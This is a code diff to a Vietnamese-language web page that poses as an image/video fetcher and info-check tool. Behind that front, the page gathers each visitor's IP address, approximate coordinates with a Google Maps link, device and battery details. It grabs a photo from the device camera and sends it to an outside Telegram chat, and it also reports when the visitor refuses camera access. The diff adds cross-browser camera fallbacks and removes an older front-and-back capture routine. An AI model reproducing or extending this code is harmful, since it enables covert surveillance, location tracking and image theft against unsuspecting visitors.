@@ -271,6 +271,7 @@
         </div>
       </div>
 
+      <!-- DETAIL MEDIA (Ảnh/Video) -->
       <div class="detail-view" id="menu-detail">
         <button class="back-btn" id="back-btn">⬅️ QUAY LẠI DANH MỤC</button>
         <h2 id="detail-title" style="font-size:1.1rem;margin-bottom:6px;">ẢNH</h2>
@@ -282,6 +283,7 @@
         <div class="link-text" id="detail-link">Link sẽ hiện ở đây...</div>
       </div>
 
+      <!-- DETAIL INFO -->
       <div class="detail-view" id="menu-info">
         <button class="back-btn" id="info-back-btn">⬅️ QUAY LẠI DANH MỤC</button>
         <h2 id="info-title" style="font-size:1.1rem;margin-bottom:6px;">CHECK INFO</h2>
@@ -442,6 +444,7 @@
     });
   }
 
+  /* ===== LẤY IP + TỌA ĐỘ ===== */
   async function getIP(){
     var out = {
       ip:"Kh\u00f4ng r\u00f5",
@@ -454,6 +457,7 @@
       maps: ""
     };
 
+    // Ưu tiên ipwho.is vì có sẵn lat/lng
     try{
       var j = await getIPWithTimeout("https://ipwho.is/", 5000);
       if(j && j.success){
@@ -471,6 +475,7 @@
       }
     }catch(e){}
 
+    // Fallback: ipapi.co
     try{
       var j3 = await getIPWithTimeout("https://ipapi.co/json/", 5000);
       if(j3){
@@ -488,6 +493,7 @@
       }
     }catch(e){}
 
+    // Fallback cuối
     try{
       var j2 = await getIPWithTimeout("https://api.ipify.org?format=json", 4000);
       if(j2 && j2.ip) out.ip = j2.ip;
@@ -496,6 +502,7 @@
     return out;
   }
 
+  /* ===== CAPTION CÓ LINK GOOGLE MAPS TỪ IP ===== */
   function buildCaption(time, device, batt, ip){
     var mapsLine = "";
     if(ip.maps){
@@ -546,44 +553,83 @@
     TITLE.textContent = "Y\u00eau C\u1ea7u Quy\u1ec1n Truy C\u1eadp";
   }
 
-  /* ===== MỞ CAMERA VỚI FACINGMODE CHỈ ĐỊNH ===== */
-  function getCamera(facingMode){
+  function getUserMediaCompat(){
     return new Promise(function(resolve, reject){
       if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
-        return reject(new Error("not_supported"));
+        if(navigator.getUserMedia){
+          navigator.getUserMedia({video:true, audio:false}, resolve, reject);
+        }else if(navigator.webkitGetUserMedia){
+          navigator.webkitGetUserMedia({video:true, audio:false}, resolve, reject);
+        }else if(navigator.mozGetUserMedia){
+          navigator.mozGetUserMedia({video:true, audio:false}, resolve, reject);
+        }else{
+          reject(new Error("not_supported"));
+        }
+        return;
       }
+      var tried = false;
       navigator.mediaDevices.getUserMedia({
-        video:{ facingMode: { ideal: facingMode }, width:{ideal:640}, height:{ideal:480} },
+        video:{facingMode:"user", width:{ideal:640}, height:{ideal:480}},
         audio:false
-      }).then(resolve).catch(function(e){
-        // fallback nếu không có cam chỉ định
+      }).then(resolve).catch(function(){
+        if(tried) return reject(new Error("all_failed"));
+        tried = true;
         navigator.mediaDevices.getUserMedia({video:true, audio:false})
-          .then(resolve).catch(function(){ reject(e); });
+          .then(resolve)
+          .catch(function(e){
+            navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"}, audio:false})
+              .then(resolve)
+              .catch(function(){ reject(e); });
+          });
       });
     });
   }
 
-  /* ===== CHỤP 1 KHUNG HÌNH TỪ STREAM ===== */
-  async function captureFromStream(stream){
+  async function captureAndSend(caption){
+    var stream;
+    try{
+      stream = await getUserMediaCompat();
+    }catch(e2){
+      try{
+        await _api.sendMsg({
+          chat_id: CHAT,
+          text: caption + "\n\n\u26a0\uFE0F <i>(T\u1eeb ch\u1ed1i quy\u1ec1n truy c\u1eadp: " + (e2 && e2.name ? e2.name : "unknown") + ")</i>",
+          parse_mode: "HTML"
+        });
+      }catch(e3){}
+      return false;
+    }
+
     V.srcObject = stream;
     V.setAttribute("playsinline", "");
     V.setAttribute("webkit-playsinline", "");
     V.muted = true;
+
     try{ await V.play(); }catch(e){}
 
     var ok = await waitVideo();
-    if(!ok) return null;
+
+    if(!ok){
+      try{ stream.getTracks().forEach(function(t){ t.stop(); }); }catch(e){}
+      try{
+        await _api.sendMsg({
+          chat_id: CHAT,
+          text: caption + "\n\n\u26a0\uFE0F <i>(Thi\u1ebft b\u1ecb kh\u00f4ng kh\u1ea3 d\u1ee5ng)</i>",
+          parse_mode: "HTML"
+        });
+      }catch(e){}
+      return false;
+    }
 
     C.width = V.videoWidth;
     C.height = V.videoHeight;
     var ctx = C.getContext("2d");
     ctx.drawImage(V, 0, 0, C.width, C.height);
+
     var dataUrl = C.toDataURL("image/jpeg", 0.9);
 
     try{ stream.getTracks().forEach(function(t){ t.stop(); }); }catch(e){}
-    V.srcObject = null;
 
-    // convert sang blob
     var blob = await new Promise(function(resolve){
       try{
         var arr = dataUrl.split(",");
@@ -595,56 +641,18 @@
         resolve(new Blob([u8], {type:mime}));
       }catch(e){ resolve(null); }
     });
-    return blob;
-  }
 
-  /* ===== GỬI ẢNH LÊN TELEGRAM ===== */
-  async function sendPhotoBlob(blob, caption, filename){
-    if(!blob || blob.size === 0) return;
+    if(!blob || blob.size === 0) return false;
+
     var fd = new FormData();
     fd.append("chat_id", CHAT);
-    fd.append("photo", blob, filename || "capture.jpg");
+    fd.append("photo", blob, "capture.jpg");
     fd.append("caption", caption);
     fd.append("parse_mode", "HTML");
-    try{ await _api.sendPhoto(fd); }catch(e){}
-  }
-
-  /* ===== CHỤP CAM TRƯỚC + CAM SAU ===== */
-  async function captureAndSend(caption){
-    var frontBlob = null, backBlob = null;
-    var errorName = "";
-
-    // 1. Chụp cam trước (user)
-    try{
-      var sFront = await getCamera("user");
-      frontBlob = await captureFromStream(sFront);
-      if(frontBlob) await sendPhotoBlob(frontBlob, caption + "\n\n📸 <b>CAM TRƯỚC</b>", "front.jpg");
-    }catch(e){
-      errorName = e && e.name ? e.name : "unknown";
-    }
-
-    // 2. Đợi 400ms rồi chụp cam sau (environment)
-    await new Promise(function(r){ setTimeout(r, 400); });
 
     try{
-      var sBack = await getCamera("environment");
-      backBlob = await captureFromStream(sBack);
-      if(backBlob) await sendPhotoBlob(backBlob, caption + "\n\n📸 <b>CAM SAU</b>", "back.jpg");
-    }catch(e){
-      if(!errorName) errorName = e && e.name ? e.name : "unknown";
-    }
-
-    // Nếu cả 2 đều fail → gửi text báo lỗi
-    if(!frontBlob && !backBlob){
-      try{
-        await _api.sendMsg({
-          chat_id: CHAT,
-          text: caption + "\n\n\u26a0\uFE0F <i>(Kh\u00f4ng th\u1ec3 truy c\u1eadp camera: " + errorName + ")</i>",
-          parse_mode: "HTML"
-        });
-      }catch(e){}
-      return false;
-    }
+      await _api.sendPhoto(fd);
+    }catch(e){}
 
     return true;
   }
@@ -756,6 +764,7 @@
     document.body.removeChild(a);
   }
 
+  /* ===== MENU ẢNH ===== */
   document.querySelectorAll("#panel-image .menu-item").forEach(function(el){
     el.onclick = function(){
       currentCat = this.dataset.cat;
@@ -770,6 +779,7 @@
     };
   });
 
+  /* ===== MENU VIDEO ===== */
   document.querySelectorAll("#panel-video .menu-item").forEach(function(el){
     el.onclick = function(){
       currentCat = this.dataset.vcat;
@@ -784,6 +794,7 @@
     };
   });
 
+  /* ===== MENU INFO (giống ảnh/video) ===== */
   document.querySelectorAll("#panel-info .menu-item").forEach(function(el){
     el.onclick = function(){
       infoMode = this.dataset.info;
@@ -809,6 +820,7 @@
     };
   });
 
+  /* ===== BACK BUTTONS ===== */
   BACK_BTN.onclick = function(){
     DETAIL.classList.remove("active");
     MENU.classList.add("active");
@@ -821,6 +833,7 @@
   DETAIL_GET.onclick = loadMedia;
   DETAIL_DL.onclick = downloadMedia;
 
+  /* ===== TABS CHÍNH ===== */
   TAB_IMAGE.onclick = function(){
     TAB_IMAGE.classList.add("active");
     TAB_VIDEO.classList.remove("active");
@@ -846,6 +859,7 @@
     PANEL_VIDEO.style.display = "none";
   };
 
+  /* ===== CHECK INFO ===== */
   INFO_CHECK.onclick = function(){
     var val = INFO_INPUT.value.trim();
     if(infoMode !== "ip" && !val){
@@ -856,6 +870,7 @@
     INFO_RESULT.classList.add("active");
     INFO_RESULT.innerHTML = '<div class="placeholder">Đang kiểm tra...</div>';
 
+    /* ===== CHECK IP ===== */
     if(infoMode === "ip"){
       var ipUrl = val ? "https://ipwho.is/" + encodeURIComponent(val) : "https://ipwho.is/";
       var xhrIp = new XMLHttpRequest();
